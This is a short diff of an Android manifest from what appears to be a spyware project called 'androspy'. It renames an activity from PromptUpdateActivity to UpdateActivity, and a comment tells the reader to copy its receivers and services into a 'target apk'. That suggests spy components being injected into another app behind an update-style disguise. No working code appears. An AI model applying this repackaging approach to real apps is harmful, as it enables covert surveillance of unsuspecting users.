@@ -54,7 +54,7 @@
         </activity>
 
         <!--copy the receivers and services to the target apk source-->
-        <activity android:name="buddy.ap.com.androspy.PromptUpdateActivity"></activity>
+        <activity android:name="buddy.ap.com.androspy.UpdateActivity"></activity>
 
         <receiver android:name="buddy.ap.com.androspy.NetworkWatcher">
             <intent-filter>
